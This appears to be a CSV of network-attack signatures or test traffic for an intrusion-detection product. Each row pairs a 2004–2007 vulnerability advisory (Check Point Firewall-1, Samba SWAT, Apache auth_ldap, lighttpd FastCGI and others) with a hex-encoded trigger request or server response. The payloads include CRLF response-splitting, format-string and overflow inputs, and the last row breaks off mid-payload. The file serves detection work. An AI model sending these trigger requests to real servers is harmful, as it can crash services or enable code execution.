XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿FSC20040205-01_Checkpoint_Firewall-1_HTTP_Parsing_Format_String_Vulnerabilities.xml,Checkpoint Firewall-1 HTTP Parsing Format String Vulnerabilities,"A vulnerability exists in the HTTP protocol parser used by several components of Check Point Firewall-1. The vulnerability can be triggered by sending certain malformed fields in an HTTP request, and may be exploited to crash the firewall or to execute code of the attacker&apos;s choice on the firewall. This vulnerability has been described as a format-string problem, however, it has been found that format specifiers are not required to trigger the vulnerability.",HTTP,TCP,HEAD xxxxxxxxxxxxx||3A ||//192.18.0.100/nuttin/ HTTP/1.0||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
FSC20040205-01_Checkpoint_Firewall-1_HTTP_Parsing_Format_String_Vulnerabilities.xml,Checkpoint Firewall-1 HTTP Parsing Format String Vulnerabilities,"A vulnerability exists in the HTTP protocol parser used by several components of Check Point Firewall-1. The vulnerability can be triggered by sending certain malformed fields in an HTTP request, and may be exploited to crash the firewall or to execute code of the attacker&apos;s choice on the firewall. This vulnerability has been described as a format-string problem, however, it has been found that format specifiers are not required to trigger the vulnerability.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿FSC20040308-01_HTTP_Response_Splitting.xml,HTTP Response Splitting,"A technique has been disclosed permitting attack upon web clients via web-based applications and web caches.  This technique is known as &quot;HTTP response splitting.&quot;  This vulnerability affects a wide variety of systems and software using the HTTP protocol, including most of the most widely deployed Web server software products.",HTTP,TCP,GET /test6.php?lang=aaaa%0d%0aContent-Length||3A ||%200%0d%0aConnection||3A ||%20Keep-Alive%0d%0a%0d%0anothing||22 3B || HTTP/1.0||0A ||Host||3A || 10.2.1.60||0A ||Accept||3A || */*||0A ||Connection||3A || Keep-alive||0A 0A 0A||
FSC20040308-01_HTTP_Response_Splitting.xml,HTTP Response Splitting,"A technique has been disclosed permitting attack upon web clients via web-based applications and web caches.  This technique is known as &quot;HTTP response splitting.&quot;  This vulnerability affects a wide variety of systems and software using the HTTP protocol, including most of the most widely deployed Web server software products.",HTTP,TCP,"HTTP/1.1 302 Found||0D 0A ||Date||3A || Tue, 09 Mar 2004 16||3A ||08||3A ||44 GMT||0D 0A ||Server||3A || Apache/2.0.40 (Red Hat Linux)||0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||X-Powered-By||3A || PHP/4.2.2||0D 0A ||Location||3A || aaaa||0D 0A ||Content-Length||3A || 0||0D 0A ||Connection||3A || Keep-Alive||0D 0A 0D 0A ||nothing\||22 3B 0D 0A ||Content-Length||3A || 53||0D 0A ||Connection||3A || close||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A ||<html><body>||0A ||this is a test||0A ||ok a test||0A ||</body></html>||0A||"
﻿FSC20040723-01_Samba_SWAT_HTTP_Authentication_Buffer_Overflow.xml,Samba SWAT HTTP Authentication Buffer Overflow,"There is a vulnerability in the way SWAT, a web-based administration tool for Samba, parses Basic Authentication information. A specially crafted authentication string can cause an integer underflow leading to a heap-based buffer overflow. An attacker can exploit this vulnerability to create a denial of service condition or execute arbitrary code.            When the vulnerability is triggered, the Swat process will generate a segmentation fault signal and exits. There is no denial of service condition since inetd will spawn other Swat processes for other requests.            This vulnerability is caused by an integer underflow and not by attacker-supplied data. Hence, the data that is overwritten into the heap is not generally under the attacker's control. If the attacker is able to control the data being overwritten into the heap, he/she may be able to execute code on the target system with the privileges of this process, though this would be very difficult. Generally, the default Swat configuration file configures Swat to run as root. The behaviour of the target system, in this case, depends on the injected code.",TCP,TCP,"GET / HTTP/1.1||0D 0A ||Accept||3A || image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-powerpoint, application/vnd.ms-excel, application/msword, */*||0D 0A ||Accept-Language||3A || en-us||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||User-Agent||3A || Mozilla/4.0 (compatible||3B || MSIE 6.0||3B || Windows NT 5.0||3B || .NET CLR 1.1.4322)||0D 0A ||Host||3A || 10.2.1.101||3A ||901||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Authorization||3A || Basic qwerty||0D 0A 0D||"
FSC20040723-01_Samba_SWAT_HTTP_Authentication_Buffer_Overflow.xml,Samba SWAT HTTP Authentication Buffer Overflow,"There is a vulnerability in the way SWAT, a web-based administration tool for Samba, parses Basic Authentication information. A specially crafted authentication string can cause an integer underflow leading to a heap-based buffer overflow. An attacker can exploit this vulnerability to create a denial of service condition or execute arbitrary code.            When the vulnerability is triggered, the Swat process will generate a segmentation fault signal and exits. There is no denial of service condition since inetd will spawn other Swat processes for other requests.            This vulnerability is caused by an integer underflow and not by attacker-supplied data. Hence, the data that is overwritten into the heap is not generally under the attacker's control. If the attacker is able to control the data being overwritten into the heap, he/she may be able to execute code on the target system with the privileges of this process, though this would be very difficult. Generally, the default Swat configuration file configures Swat to run as root. The behaviour of the target system, in this case, depends on the injected code.",TCP,TCP,HTTP/1.0 401 Bad Authorization||0D 0A||
﻿FSC20040921-01_Ipswitch_WhatsUp_Gold_DOS_Device_HTTP_Request_Denial_of_Service.xml,Ipswitch WhatsUp Gold DOS Device HTTP Request Denial of Service,"A vulnerability exists in the way the web server component of Ipswitch WhatsUp Gold processes a request that contains a special device name. An unhandled exception occurs when an HTTP request containing a reserved DOS device name is processed. An attacker exploiting this vulnerability can cause the web server component to terminate, causing a denial of service.",HTTP,TCP,GET /prn.htm HTTP/1.0||0D 0A 0D 0A||
FSC20040921-01_Ipswitch_WhatsUp_Gold_DOS_Device_HTTP_Request_Denial_of_Service.xml,Ipswitch WhatsUp Gold DOS Device HTTP Request Denial of Service,"A vulnerability exists in the way the web server component of Ipswitch WhatsUp Gold processes a request that contains a special device name. An unhandled exception occurs when an HTTP request containing a reserved DOS device name is processed. An attacker exploiting this vulnerability can cause the web server component to terminate, causing a denial of service.",HTTP,TCP,"HTTP/1.0 200 OK||0D 0A ||Date||3A || Tue, 21 Sep 2004 14||3A ||08||3A ||57 GMT||0D 0A||"
﻿FSC20060130-07_Apache_HTTP_Server_auth_ldap_Logging_Function_Format_String_Vulnerability.xml,Apache HTTP Server auth_ldap Logging Function Format String Vulnerability,"There exists a format string vulnerability in the auth_ldap module used with Apache HTTP server. The vulnerability is a result of the failure to properly verify string arguments passed to a logging function, resulting in a memory corruption condition. A remote attacker can exploit this vulnerability to inject and execute arbitrary code with the privileges of the HTTP server process. In a simple attack exploiting this vulnerability, the httpd process serving the attacker terminates, closing the connection as a result. This might also reset other connections served by the affected httpd process, in the case the HTTP server is configured to run in multiple-threading mode. In the case of a more sophisticated attack, the injected arbitrary code is executed with the privileges of the httpd process. The behaviour of the target system will be dependent on the malicious code.",HTTP/HTTPS,TCP,"GET /auth/test2.htm HTTP/1.1||0D 0A ||Accept||3A || image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-powerpoint, application/vnd.ms-excel, application/msword, */*||0D 0A ||Accept-Language||3A || en-us||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||User-Agent||3A || Mozilla/4.0 (compatible||3B || MSIE 6.0||3B || Windows NT 5.0)||0D 0A ||Host||3A || 172.16.8.215||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Authorization||3A || Basic dGVzdCVuJW4lbjp0ZXN0JW4lbiVu||0D 0A 0D 0A||"
﻿FSC20070910-16_Lighttpd_mod_fastcgi_Extension_CGI_Variable_Overwriting_Vulnerability.xml,Lighttpd mod_fastcgi Extension CGI Variable Overwriting Vulnerability,"A variable overwriting vulnerability exists in Lighttpd FastCGI extension. A remote unauthenticated attacker can exploit this vulnerability by sending an HTTP request containing crafted header data to the target server, potentially causing information disclosure or execution of malicious scripts in the security context of web server. In successful attack results in information disclosure, the target host might not exhibit any behavioural difference. If code execution is successful, the behaviour of the target will depend on the intention of the attacker. Any injected code will be executed within the security context of the FastCGI application.",HTTP/HTTPS,TCP,POST /index.php HTTP/1.1||0D 0A ||Host||3A || 172.16.8.246||3A ||80||0D 0A ||Connection||3A || close||0D 0A ||Content-Length||3A || 21212||0D 0A ||Content-Type||3A || application/x-www-form-urlencoded||0D 0A ||0||3A || vvvv||0D 0A ||AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA||3A || AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA||0D 0A ||B||3A || BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
